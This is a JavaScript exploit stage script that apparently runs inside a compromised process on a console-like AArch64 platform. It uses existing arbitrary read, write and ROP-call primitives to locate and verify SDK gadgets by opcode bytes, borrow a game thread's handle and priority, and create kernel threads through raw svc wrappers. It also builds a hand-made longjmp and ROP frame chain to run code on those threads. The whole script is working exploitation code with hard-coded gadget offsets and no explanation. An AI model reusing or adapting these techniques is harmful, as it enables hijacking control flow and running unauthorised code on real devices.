(async function () {
  // Raw-svc thread qualification: creates at most one kernel thread per phase
  // through the bare svcCreateThread wrapper, never through nn::os::CreateThread.
  // Phase A proves create+start+exit; phase B proves a full worker frame chain.
  const QUERY_OFFSET = 0x168B0Cn;
  const EXPECTED_QUERY = 'e10f1ff8c10000d4e20340f9410000b9ff430091c0035fd6e10000d4c0035fd6';
  const LONGJMP_OFFSET = 0x5511B4n;
  const LONGJMP_BYTES = '135040a9155841a9176042a9196843a91b7044a91d7845a9023440f95f0000910824476d0a2c486d0c34496d0e3c4a6d3f00007120149f1ac0031fd6';
  const LOAD_TABLE_OFFSET = 319636n;
  const LOAD_TABLE_BYTES = 'a80240f90041348bf44f42a9f50b40f9fd7bc3a8c0035fd6';
  const CALL4_OFFSET = 3513224n;
  const CALL4_BYTES = 'e00319aae10315aae20314aae30313aae7031faa083940f900013fd6f44f4ea9f6574da9f85f4ca9fa674ba9fd7b4aa9ffc30391c0035fd6';
  const SAVE_RESULT64_OFFSET = 1686720n;
  const SAVE_RESULT64_BYTES = '600200f9f30b40f9fd7bc2a8c0035fd6';
  const MEMMOVE_OFFSET = 0x522830n;
  const MEMMOVE_BYTES = '1f0001ebe00a00542800028b1f0100eb';
  const SVC_EXIT_THREAD = 0x168B4Cn;
  const EXIT_THREAD_BYTES = '410100d4c0035fd6';
  const SVC_CREATE_THREAD = 0x168B2Cn;
  const CREATE_THREAD_BYTES = 'e00f1ff8010100d4e20340f9410000b9ff430091c0035fd6';
  const SVC_START_THREAD = 0x168B44n;
  const START_THREAD_BYTES = '210100d4c0035fd6';
  const SVC_CLOSE_HANDLE = 0x168BE4n;
  const CLOSE_HANDLE_BYTES = 'c10200d4c0035fd6';
  const SVC_WAIT_SYNC = 0x168BF4n;
  const WAIT_SYNC_BYTES = 'e00f1ff8010300d4e20340f9410000b9ff430091c0035fd6';
  const SVC_CURRENT_CORE = 0x168BA4n;
  const CURRENT_CORE_BYTES = '010200d4c0035fd6';
  const SVC_GET_CORE_MASK = 0x168B7Cn;
  const GET_CORE_MASK_BYTES = 'e007bfa9c10100d4e30340f9610000b9e30740f9620000f9ff430091c0035fd6';
  const SVC_GET_PRIORITY = 0x168B5Cn;
  const GET_PRIORITY_BYTES = 'e00f1ff8810100d4e20340f9410000b9ff430091c0035fd6';
  const MANAGER_PTR_OFFSET = 0xB22280n;
  const MANAGER_BIAS = 0xF0n, LIST_SENTINEL = 0x1D0n, NODE_HANDLE = 0x1B0n, NODE_PRIORITY = 0x44n;
  const FALLBACK_PRIORITY = 44n;
  const STACK_BYTES = 0x14000n;
  const WAIT_NS = 0x77359400n;
  const SENTINEL = 0xfedcba9876543210n;
  const EXPECTED = 0xc0ffee1234567890n;
  const RESULT = 0x800n, TABLES = 0x1000n, FRAME_STACK = 0x12000n, FRAME_BYTES = 0x17000n;
  const hex = value => '0x' + BigInt(value).toString(16);
  const require = (condition, message) => { if (!condition) throw Error(message); };
  const fromHex = text => Uint8Array.from(text.match(/.{2}/g), byte => parseInt(byte, 16));
  const equal = (a, b) => a.length === b.length && a.every((value, index) => value === b[index]);
  const align = raw => {
    require((raw & 0xFFFn) === 0n, 'malloc is not page aligned: ' + hex(raw));
    return raw;
  };
  let aux = 0n, ctrl = 0n, frameA = 0n, stackA = 0n, frameB = 0n, stackB = 0n, qm = 0n, sdk = 0n;
  const handles = [];
  const verdict = {probe: 'raw-svc-thread', phaseA: null, phaseB: null, error: null};

  function query(address) {
    if (address < 0n || address >= 1n << 39n) return null;
    const result = call_rop(qm, aux, aux + 0x40n, address);
    if (result !== 0n) return null;
    return {
      base: read64(aux), size: read64(aux + 8n), type: Number(read32(aux + 0x10n)),
      attributes: Number(read32(aux + 0x14n)), permissions: Number(read32(aux + 0x18n)),
      ipcReferences: Number(read32(aux + 0x1Cn)), deviceReferences: Number(read32(aux + 0x20n)),
    };
  }

  function owned(address, length) {
    const region = query(address);
    require(region && region.base <= address && address + BigInt(length) <= region.base + region.size,
      'Unmapped range at ' + hex(address));
    require(region.type === 5 && region.permissions === 3 && region.attributes === 0 &&
      region.ipcReferences === 0 && region.deviceReferences === 0,
      'Region is not ordinary owned type-5 RW memory at ' + hex(address));
    return region;
  }

  function expectCode(sdk, offset, bytes, label) {
    require(equal(read_buffer(sdk + offset, bytes.length / 2), fromHex(bytes)), label + ' bytes differ');
  }

  function closeHandles(sdk) {
    const closed = [];
    for (const handle of handles.splice(0)) {
      const result = call_rop(sdk + SVC_CLOSE_HANDLE, BigInt(handle), 0n, 0n);
      closed.push({handle, result: hex(result)});
    }
    return closed;
  }

  async function runPhase(sdk, label, frame, stackTop, core, priority) {
    write64(ctrl, 0n);
    await log(JSON.stringify({phase: label, step: 'create-attempt', frame: hex(frame), core: Number(core), priority: Number(priority)}));
    const created = call_rop(sdk + SVC_CREATE_THREAD, ctrl, sdk + LONGJMP_OFFSET, frame, stackTop, priority, core);
    if (created !== 0n) return {createResult: hex(created)};
    const handle = Number(read32(ctrl));
    require(handle > 0 && handle < 0xffff8000, 'Invalid thread handle: ' + handle);
    handles.push(handle);
    const started = call_rop(sdk + SVC_START_THREAD, BigInt(handle), 0n, 0n);
    if (started !== 0n) return {createResult: '0x0', startResult: hex(started), handle};
    write64(ctrl + 0x08n, 0n);
    write64(ctrl + 0x10n, BigInt(handle));
    const waited = call_rop(sdk + SVC_WAIT_SYNC, ctrl + 0x08n, ctrl + 0x10n, 1n, WAIT_NS);
    return {createResult: '0x0', startResult: '0x0', waitResult: hex(waited),
      waitIndex: Number(read32(ctrl + 0x08n)), handle};
  }

  try {
    aux = malloc(0x100);
    require(aux !== 0n, 'aux malloc failed');
    let previousHigh = 0n;
    for (let address = sdk_base; address < sdk_base + 0x5F0000n; address += 8n) {
      const pair = read64(address);
      const low = pair & 0xFFFFFFFFn, high = pair >> 32n;
      if (low === 0xF81F0FE1n && high === 0xD40000C1n) { qm = address; break; }
      if (previousHigh === 0xF81F0FE1n && low === 0xD40000C1n) { qm = address - 4n; break; }
      previousHigh = high;
    }
    require(qm !== 0n, 'svcQueryMemory wrapper not found');
    const sdkRegion = query(qm);
    require(sdkRegion && sdkRegion.base + QUERY_OFFSET === qm && sdkRegion.size >= 0x602000n &&
      sdkRegion.permissions === 5, 'Unexpected SDK text region');
    require(equal(read_buffer(qm, 32), fromHex(EXPECTED_QUERY)), 'svcQueryMemory bytes differ');
    sdk = sdkRegion.base;
    expectCode(sdk, LONGJMP_OFFSET, LONGJMP_BYTES, 'longjmp');
    expectCode(sdk, LOAD_TABLE_OFFSET, LOAD_TABLE_BYTES, 'loadTable');
    expectCode(sdk, CALL4_OFFSET, CALL4_BYTES, 'call4');
    expectCode(sdk, SAVE_RESULT64_OFFSET, SAVE_RESULT64_BYTES, 'saveResult64');
    expectCode(sdk, MEMMOVE_OFFSET, MEMMOVE_BYTES, 'memmove');
    expectCode(sdk, SVC_EXIT_THREAD, EXIT_THREAD_BYTES, 'ExitThread');
    expectCode(sdk, SVC_CREATE_THREAD, CREATE_THREAD_BYTES, 'CreateThread wrapper');
    expectCode(sdk, SVC_START_THREAD, START_THREAD_BYTES, 'StartThread');
    expectCode(sdk, SVC_CLOSE_HANDLE, CLOSE_HANDLE_BYTES, 'CloseHandle');
    expectCode(sdk, SVC_WAIT_SYNC, WAIT_SYNC_BYTES, 'WaitSynchronization wrapper');
    expectCode(sdk, SVC_CURRENT_CORE, CURRENT_CORE_BYTES, 'GetCurrentProcessorNumber');
    expectCode(sdk, SVC_GET_CORE_MASK, GET_CORE_MASK_BYTES, 'GetThreadCoreMask wrapper');
    expectCode(sdk, SVC_GET_PRIORITY, GET_PRIORITY_BYTES, 'GetThreadPriority wrapper');

    ctrl = align(malloc(0x2000));
    frameA = align(malloc(0x2000));
    stackA = align(malloc(STACK_BYTES + 0x1000n));
    frameB = align(malloc(FRAME_BYTES + 0x1000n));
    stackB = align(malloc(STACK_BYTES + 0x1000n));
    require(ctrl && frameA && stackA && frameB && stackB, 'probe allocation failed');
    owned(ctrl, 0x40); owned(frameA, 0x1000); owned(frameB, Number(FRAME_BYTES));
    owned(stackA, Number(STACK_BYTES)); owned(stackB, Number(STACK_BYTES));


    // Phase A: thread that longjmps straight into svcExitThread.
    write64(frameA + 0x58n, sdk + SVC_EXIT_THREAD);
    write64(frameA + 0x68n, stackA + STACK_BYTES);
    // Borrow scheduling parameters from an existing game thread: the manager
    // list node exposes its real kernel handle and its stored priority.
    const manager = read64(sdk + MANAGER_PTR_OFFSET) + MANAGER_BIAS;
    const managerRegion = query(manager);
    require(managerRegion && managerRegion.base <= manager &&
      manager + 0x1F0n <= managerRegion.base + managerRegion.size &&
      (managerRegion.permissions & 1) !== 0, 'Thread manager is not readable');
    const sentinel = manager + LIST_SENTINEL;
    const node = read64(sentinel);
    require(node !== sentinel && node % 8n === 0n, 'Thread manager list is empty or corrupt');
    const nodeRegion = query(node);
    require(nodeRegion && nodeRegion.base <= node &&
      node + 0x1B4n <= nodeRegion.base + nodeRegion.size &&
      (nodeRegion.permissions & 1) !== 0, 'Thread node is not readable');
    const threadHandle = Number(read32(node + NODE_HANDLE));
    require(threadHandle > 0 && threadHandle < 0xffff8000, 'Invalid borrowed thread handle');
    // The kernel is the priority authority: the struct halfword at +0x88 read
    // back 0 on hardware, and the nn::os getter decodes ThreadType+0x44, so the
    // borrowed handle feeds svcGetThreadPriority directly.
    const priorityResult = call_rop(sdk + SVC_GET_PRIORITY, ctrl + 0x20n, BigInt(threadHandle), 0n);
    require(priorityResult === 0n, 'GetThreadPriority failed: ' + hex(priorityResult));
    const priority = BigInt(Number(read32(ctrl + 0x20n)));
    require(priority > 0n && priority < 64n, 'Invalid borrowed priority: ' + priority);
    const structPriority = Number(read16(node + NODE_PRIORITY));
    const maskResult = call_rop(sdk + SVC_GET_CORE_MASK, ctrl + 0x18n, ctrl + 0x38n, BigInt(threadHandle));
    require(maskResult === 0n, 'GetThreadCoreMask failed: ' + hex(maskResult));
    const coreMask = read64(ctrl + 0x38n);
    const candidates = [];
    for (let bit = 0n; bit < 64n; bit++) if ((coreMask >> bit) & 1n) candidates.push(Number(bit));
    require(candidates.length > 0, 'Process has no allowed CPU cores');
    // Hardware evidence: cores 6 and 7 passed svcCreateThread core validation
    // while the borrowed mask's cores were rejected with InvalidCoreId, so
    // always try them after the borrowed cores.
    for (const extra of [6, 7]) if (!candidates.includes(extra)) candidates.push(extra);
    const currentCore = Number(call_rop(sdk + SVC_CURRENT_CORE, 0n, 0n, 0n));
    await log(JSON.stringify({step: 'thread-info', currentCore, priority: Number(priority),
      structPriority, coreMask: hex(coreMask), idealCore: Number(read32(ctrl + 0x18n))}));
    let core = -1n;
    for (const candidate of candidates) {
      const attempt = await runPhase(sdk, 'A', frameA, stackA + STACK_BYTES, BigInt(candidate), priority);
      await log(JSON.stringify({phase: 'A', core: candidate, result: attempt}));
      if (attempt.createResult === '0x0') { core = BigInt(candidate); verdict.phaseA = attempt; break; }
      require(attempt.createResult === '0xe001', 'Unexpected create error: ' + attempt.createResult);
    }
    require(core >= 0n, 'No allowed core accepted svcCreateThread');

    if (verdict.phaseA.waitResult === '0x0' && verdict.phaseA.waitIndex === 0) {
      // Phase B: thread running one memmove call through the worker frame chain.
      write64(frameB + 0x10n, frameB + TABLES);
      write64(frameB + 0x30n, ctrl + 0x20n);
      write64(frameB + 0x58n, sdk + LOAD_TABLE_OFFSET);
      write64(frameB + 0x68n, frameB + FRAME_STACK);
      write64(frameB + TABLES, frameB + TABLES + 0x10n);
      write64(frameB + TABLES + 0x80n, sdk + MEMMOVE_OFFSET);
      write64(frameB + RESULT, SENTINEL);
      const sp = frameB + FRAME_STACK;
      write64(sp + 0x08n, sdk + CALL4_OFFSET);
      write64(sp + 0x10n, ctrl + 0x28n);
      write64(sp + 0x20n, 8n);
      write64(sp + 0x28n, 0n);
      write64(sp + 0xd8n, sdk + SAVE_RESULT64_OFFSET);
      write64(sp + 0x118n, frameB + RESULT);
      write64(sp + 0x128n, sdk + SVC_EXIT_THREAD);
      write64(ctrl + 0x20n, 0n);
      write64(ctrl + 0x28n, EXPECTED);
      verdict.phaseB = await runPhase(sdk, 'B', frameB, stackB + STACK_BYTES, core, priority);
      const sentinel = read64(ctrl + 0x20n);
      const stored = read64(frameB + RESULT);
      verdict.phaseB.sentinel = hex(sentinel);
      verdict.phaseB.storedResult = hex(stored);
      verdict.phaseB.pass = verdict.phaseB.waitResult === '0x0' && verdict.phaseB.waitIndex === 0 &&
        sentinel === EXPECTED && stored === ctrl + 0x20n;
      await log(JSON.stringify({phase: 'B', result: verdict.phaseB}));
    }
  } catch (error) {
    verdict.error = error.message;
  } finally {
    verdict.closed = sdk !== 0n ? closeHandles(sdk) : [];
    await log(JSON.stringify(verdict));
    for (const allocation of [stackB, frameB, stackA, frameA, ctrl]) if (allocation !== 0n) free(allocation);
    if (aux !== 0n) free(aux);
  }
})();
